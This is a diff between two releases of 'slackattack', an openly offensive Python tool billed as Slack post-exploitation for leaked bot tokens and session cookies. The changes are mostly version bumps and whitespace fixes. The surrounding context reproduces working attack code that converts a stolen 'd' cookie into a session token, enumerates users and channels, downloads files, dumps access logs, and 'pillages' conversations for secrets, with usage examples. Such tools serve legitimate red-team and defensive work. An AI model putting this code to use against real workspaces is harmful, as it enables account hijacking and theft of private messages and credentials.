# Comparing `tmp/slackattack-1.1.5.tar.gz` & `tmp/slackattack-1.1.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "slackattack-1.1.5.tar", last modified: Tue May 28 01:56:10 2024, max compression
+gzip compressed data, was "slackattack-1.1.6.tar", last modified: Tue May 28 01:59:42 2024, max compression
```

## Comparing `slackattack-1.1.5.tar` & `slackattack-1.1.6.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxr-xr-x   0 runner    (1001) docker     (127)        0 2024-05-28 01:56:10.352348 slackattack-1.1.5/
--rw-r--r--   0 runner    (1001) docker     (127)     1072 2024-05-28 01:56:06.000000 slackattack-1.1.5/LICENSE
--rw-r--r--   0 runner    (1001) docker     (127)     7506 2024-05-28 01:56:10.352348 slackattack-1.1.5/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (127)     7047 2024-05-28 01:56:06.000000 slackattack-1.1.5/README.md
--rw-r--r--   0 runner    (1001) docker     (127)      629 2024-05-28 01:56:06.000000 slackattack-1.1.5/pyproject.toml
--rw-r--r--   0 runner    (1001) docker     (127)       38 2024-05-28 01:56:10.352348 slackattack-1.1.5/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (127)      897 2024-05-28 01:56:06.000000 slackattack-1.1.5/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (127)        0 2024-05-28 01:56:10.352348 slackattack-1.1.5/slackattack.egg-info/
--rw-r--r--   0 runner    (1001) docker     (127)     7506 2024-05-28 01:56:10.000000 slackattack-1.1.5/slackattack.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (127)      230 2024-05-28 01:56:10.000000 slackattack-1.1.5/slackattack.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (127)        1 2024-05-28 01:56:10.000000 slackattack-1.1.5/slackattack.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (127)       37 2024-05-28 01:56:10.000000 slackattack-1.1.5/slackattack.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (127)        1 2024-05-28 01:56:10.000000 slackattack-1.1.5/slackattack.egg-info/top_level.txt
--rwxr-xr-x   0 runner    (1001) docker     (127)    34078 2024-05-28 01:56:06.000000 slackattack-1.1.5/slackattack.py
+drwxr-xr-x   0 runner    (1001) docker     (127)        0 2024-05-28 01:59:42.086888 slackattack-1.1.6/
+-rw-r--r--   0 runner    (1001) docker     (127)     1072 2024-05-28 01:59:37.000000 slackattack-1.1.6/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (127)     7506 2024-05-28 01:59:42.086888 slackattack-1.1.6/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (127)     7047 2024-05-28 01:59:37.000000 slackattack-1.1.6/README.md
+-rw-r--r--   0 runner    (1001) docker     (127)      629 2024-05-28 01:59:37.000000 slackattack-1.1.6/pyproject.toml
+-rw-r--r--   0 runner    (1001) docker     (127)       38 2024-05-28 01:59:42.086888 slackattack-1.1.6/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (127)      897 2024-05-28 01:59:37.000000 slackattack-1.1.6/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (127)        0 2024-05-28 01:59:42.086888 slackattack-1.1.6/slackattack.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (127)     7506 2024-05-28 01:59:42.000000 slackattack-1.1.6/slackattack.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (127)      230 2024-05-28 01:59:42.000000 slackattack-1.1.6/slackattack.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (127)        1 2024-05-28 01:59:42.000000 slackattack-1.1.6/slackattack.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (127)       37 2024-05-28 01:59:42.000000 slackattack-1.1.6/slackattack.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (127)        1 2024-05-28 01:59:42.000000 slackattack-1.1.6/slackattack.egg-info/top_level.txt
+-rwxr-xr-x   0 runner    (1001) docker     (127)    34024 2024-05-28 01:59:37.000000 slackattack-1.1.6/slackattack.py
```

### Comparing `slackattack-1.1.5/LICENSE` & `slackattack-1.1.6/LICENSE`

 * *Files identical despite different names*

### Comparing `slackattack-1.1.5/PKG-INFO` & `slackattack-1.1.6/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: slackattack
-Version: 1.1.5
+Version: 1.1.6
 Summary: Slack post-exploitation script for leaked bot tokens and "d" cookies
 Home-page: https://github.com/fr4nk3nst1ner/slackattack
 Author: Jonathan Stines
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `slackattack-1.1.5/README.md` & `slackattack-1.1.6/README.md`

 * *Files identical despite different names*

### Comparing `slackattack-1.1.5/pyproject.toml` & `slackattack-1.1.6/pyproject.toml`

 * *Files 1% similar despite different names*

```diff
@@ -1,14 +1,14 @@
 [build-system]
 requires = ["setuptools", "wheel"]
 build-backend = "setuptools.build_meta"
 
 [project]
 name = "slackattack"
-version = "1.1.5"
+version = "1.1.6"
 description = "Slack post-exploitation script for leaked bot tokens and xoxd cookies"
 authors = [
   { name = "Jonathan Stines", email = "jonathan.stines@gmail.com" }
 ]
 readme = "README.md"
 license = { text = "UNKNOWN" }
 classifiers = [
```

### Comparing `slackattack-1.1.5/setup.py` & `slackattack-1.1.6/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -9,15 +9,15 @@
         requirements = f.read().splitlines() if os.path.exists('requirements.txt') else []
 
 except FileNotFoundError:
     requirements = []
 
 setup(
     name='slackattack',
-    version='1.1.5',
+    version='1.1.6',
     author='Jonathan Stines',
     description='Slack post-exploitation script for leaked bot tokens and "d" cookies',
     long_description=long_description,
     long_description_content_type='text/markdown',
     url='https://github.com/fr4nk3nst1ner/slackattack',
     packages=find_packages(),
     install_requires=requirements,
```

### Comparing `slackattack-1.1.5/slackattack.egg-info/PKG-INFO` & `slackattack-1.1.6/slackattack.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: slackattack
-Version: 1.1.5
+Version: 1.1.6
 Summary: Slack post-exploitation script for leaked bot tokens and "d" cookies
 Home-page: https://github.com/fr4nk3nst1ner/slackattack
 Author: Jonathan Stines
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `slackattack-1.1.5/slackattack.py` & `slackattack-1.1.6/slackattack.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,17 +1,18 @@
+#!/usr/bin/python3
 import argparse
 import requests
 import os
 from datetime import datetime, timezone
 import hashlib
 import re
 import uuid
 import urllib3
-from termcolor import colored   
-import json 
+from termcolor import colored
+import json
 from banner import get_main_banner, get_sub_banner
 
 verbose = False
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 unique_hashes = set()
 
@@ -74,21 +75,21 @@
                  "staging",
                  "swagger",
                  "travis",
                  "trello"])
 
 def make_cookie_request(workspace_url, user_cookie, proxy=None, verify_ssl=False):
     try:
-        # remove extra 'd='  from cookie 
+        # remove extra 'd='  from cookie
         user_cookie = re.sub(r'^d=', '', user_cookie)
 
         response = requests.get(workspace_url, cookies={'d': user_cookie}, proxies={'http': proxy, 'https': proxy}, verify=verify_ssl)
         response.raise_for_status()
 
-        # Extract user session token using regex 
+        # Extract user session token using regex
         user_session_token_match = re.search(r'(xox[a-zA-Z]-[a-zA-Z0-9-]+)', response.text)
         if user_session_token_match:
             return user_session_token_match.group(0)
         else:
             print("[ERROR]: User session token not found in the response.")
             return None
 
@@ -108,15 +109,15 @@
         boundary = "----WebKitFormBoundary" + str(uuid.uuid4()).replace("-", "")
         headers = {
             "Content-Type": f"multipart/form-data; boundary={boundary}",
             "Origin": "https://api.slack.com",
             "Cookie": f"{credentials['cookie']}",
         }
 
-        # Create the payload for the POST request body 
+        # Create the payload for the POST request body
         payload = (
             f"--{boundary}\r\n"
             f"Content-Disposition: form-data; name=\"token\"\r\n\r\n"
             f"{user_session_token}\r\n"
             f"--{boundary}--\r\n"
         )
 
@@ -141,46 +142,46 @@
         response.raise_for_status()
         data = response.json()
 
         if not response.status_code == 200 and data.get("ok"):
             print("Request failed.")
             print(f"Error message: {data.get('error', 'N/A')}")
 
-        return data   
+        return data
 
     except requests.exceptions.RequestException as exception:
         print(f"[ERROR]: {exception}")
-        return None   
+        return None
 
 def test_credentials(credentials, proxy, verify_ssl=False):
     if 'token' in credentials:
         test_url = "https://slack.com/api/auth.test"
-        payload = None   
+        payload = None
 
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
         if response:
             print("Response:")
-            print(json.dumps(response, indent=4))   
+            print(json.dumps(response, indent=4))
 
     elif 'cookie' in credentials:
         user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
         if not user_session_token:
             print("[ERROR]: Unable to obtain user session token.")
             return
 
         test_url = "https://slack.com/api/auth.test"
         response = make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)
         if response:
             print("Response:")
-            print(json.dumps(response, indent=4))   
+            print(json.dumps(response, indent=4))
 
 def list_channels(credentials, proxy, verify_ssl=False):
     if 'token' in credentials:
         test_url = "https://slack.com/api/conversations.list"
-        payload = None   
+        payload = None
 
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
         if response:
             channels_list = response.get("channels", [])
             return channels_list
         else:
             print("Error in make_slack_request")
@@ -204,15 +205,15 @@
 
 
 
 def list_file_urls(credentials, channel, proxy, verify_ssl=False):
 
     if 'token' in credentials:
         test_url = "https://slack.com/api/files.list"
-        payload = None   
+        payload = None
 
         response_data = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
     elif 'cookie' in credentials:
         user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
         if not user_session_token:
             print("[ERROR]: Unable to obtain user session token.")
@@ -228,15 +229,15 @@
         return None
 
 def list_files(credentials, proxy, verbose=False, verify_ssl=False):
     all_file_urls = []
 
     if 'token' in credentials:
         test_url = "https://slack.com/api/files.list"
-        payload = None   
+        payload = None
 
         response_data = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
     elif 'cookie' in credentials:
         user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
         if not user_session_token:
             print("[ERROR]: Unable to obtain user session token.")
@@ -284,15 +285,15 @@
     filename = f"{timestamp}_{unique_id}_{url.split('/')[-1]}"
     return filename
 
 def list_user_list(credentials, proxy=None, verify_ssl=False):
 
     if 'token' in credentials:
         test_url = "https://slack.com/api/users.list"
-        payload = None   
+        payload = None
 
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
         if response is not None and response.get("ok"):
             return response["members"]
         else:
             print("Error retrieving user list.")
@@ -302,29 +303,29 @@
     elif 'cookie' in credentials:
         user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
         if not user_session_token:
             print("[ERROR]: Unable to obtain user session token.")
             return
 
         test_url = "https://slack.com/api/users.list"
-        payload = None  
+        payload = None
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
         if response is not None and response.get("ok"):
             return response["members"]
         else:
             print("Error retrieving user list.")
             return []
 
 def check_user_membership(credentials, channel_id):
     if 'token' in credentials:
         url = f"https://slack.com/api/conversations.members?channel={channel_id}"
         headers = {"Authorization": f"Bearer {credentials['token']}"}
     elif 'cookie' in credentials:
-        url = f"https://slack.com/api/conversations.members?channel={channel_id}" 
+        url = f"https://slack.com/api/conversations.members?channel={channel_id}"
         headers = {"Cookie": f"{credentials['cookie']}"}
 
     response = requests.get(url, headers=headers)
     data = response.json()
     if response.status_code == 200 and data.get("ok"):
         return True
     return False
@@ -418,15 +419,15 @@
             "API Token Permissions": {
                 "files.list": files_list_permission,
                 "users.list": users_list_permission,
                 "conversations.list": conversations_list_permission,
             },
             "Available Flags": available_flags,
         }
-    
+
 def check_dump_logs_permission(credentials, proxy=None, verify_ssl=False):
     if 'token' in credentials:
         url = "https://slack.com/api/team.accessLogs"
         headers = {"Authorization": f"Bearer {credentials['token']}"}
         response = make_slack_request(url, credentials, method="GET", proxy=proxy, verify_ssl=verify_ssl)
 
     elif 'cookie' in credentials:
@@ -460,19 +461,19 @@
     elif 'cookie' in credentials:
         user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
         if not user_session_token:
             print("[ERROR]: Unable to obtain user session token.")
             return
 
         test_url = "https://slack.com/api/team.accessLogs"
-        payload = None  
+        payload = None
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
     if isinstance(response, dict):
-        data = response   
+        data = response
     elif response:
         try:
             data = response.json()
         except json.JSONDecodeError:
             print("[ERROR]: Unable to decode JSON response.")
             print("Response:", response.text)
             return
@@ -513,20 +514,20 @@
         for message in messages:
             channel_name = conversation_name  # Assumes channel name is the same as conversation name
             channel_id = conversation_id
             timestamp = message.get('ts', 'N/A')
             sender_info = f"User ID: {message.get('user', 'N/A')}, Username: {message.get('username', 'N/A')}"
 
             text = message.get('text', '')
-            find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text) 
+            find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text)
 
 def retrieve_conversation_messages(credentials, conversation_id, proxy, verify_ssl=False):
     if 'token' in credentials:
         test_url = f"https://slack.com/api/conversations.history?channel={conversation_id}"
-        payload = None  
+        payload = None
 
         response = make_slack_request(test_url, credentials, method="GET", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
     elif 'cookie' in credentials:
         user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
         if not user_session_token:
             print("[ERROR]: Unable to obtain user session token.")
@@ -601,27 +602,27 @@
 
     if results:
         print(json.dumps(results, indent=2))
 
 def save_output_to_json(data, filename):
     with open(filename, 'w') as json_file:
         json.dump(data, json_file, indent=2)
-    
+
 class ExamplesAction(argparse.Action):
     def __call__(self, parser, namespace, values, option_string=None):
         examples = """
         Examples of usage:
 
         Using a Slack API token:
             python slackattack.py --token xoxb-1234567890 --list-users
             python slackattack.py --token xoxb-1234567890 --list-channels
             python slackattack.py --token xoxb-1234567890 --test
             python slackattack.py --token xoxb-1234567890 --check-permissions
             python slackattack.py --token xoxb-1234567890 --pillage
-        
+
         Using a user-supplied cookie:
             python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --list-users
             python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --list-channels
             python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --test
             python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --check-permissions
             python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --pillage
         """
@@ -635,15 +636,15 @@
 def main():
     output_data = {}
     parser = argparse.ArgumentParser(description="Post-Ex tool for Slack bot and user tokens.", formatter_class=CustomHelpFormatter)
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("--token", type=str, help="Slack API token")
     group.add_argument("--cookie", type=str, help="User-supplied cookie")
     parser.add_argument("--workspace-url", type=str, help="Workspace URL for authenticating user session token")
-    
+
     parser.add_argument("--pillage", action='store_true', help="Search conversations for secrets")
     parser.add_argument("--output-json", "-o", type=str, help="Save output in JSON format to the specified file")
 
     parser.add_argument("--test", action='store_true', help="Test Slack credentials")
     parser.add_argument("--download-files", action='store_true', help="Download files")
     parser.add_argument("--output-directory", type=str, help="Output directory for downloaded files")
     parser.add_argument("--list-users", action='store_true', help="Get list of users")
@@ -705,15 +706,15 @@
             }
             output_data["Channels"].append(channel_info)
 
         if args.output_json:
             save_output_to_json(output_data, args.output_json)
         else:
             print(json.dumps(output_data, indent=2))
-    
+
 #    elif args.list_file_urls:
 #        channel_list = list_channels(credentials, proxy)
 #        for channel in channel_list:
 #            channel_id = channel['id']
 #            list_file_urls(credentials, channel_id, proxy)
 
         if args.output_json:
@@ -762,16 +763,16 @@
 
         if args.output_json:
             save_output_to_json(output_data, args.output_json)
         else:
             print(json.dumps(output_data, indent=2))
 
     elif args.check_permissions:
-        proxy = args.proxy  
-        permissions = check_permissions(credentials, use_proxy=True, proxy_url=proxy) 
+        proxy = args.proxy
+        permissions = check_permissions(credentials, use_proxy=True, proxy_url=proxy)
         print("API Token Permissions:")
         for endpoint, permission in permissions['API Token Permissions'].items():
             print(f"{endpoint}: {permission}")
 
         print()
         print("Available Flags:")
         for flag in permissions['Available Flags']:
@@ -797,8 +798,8 @@
 
         if args.output_json:
             save_output_to_json(output_data, args.output_json)
         else:
             print(json.dumps(output_data, indent=2))
 
 if __name__ == "__main__":
-    main() 
+    main()
```

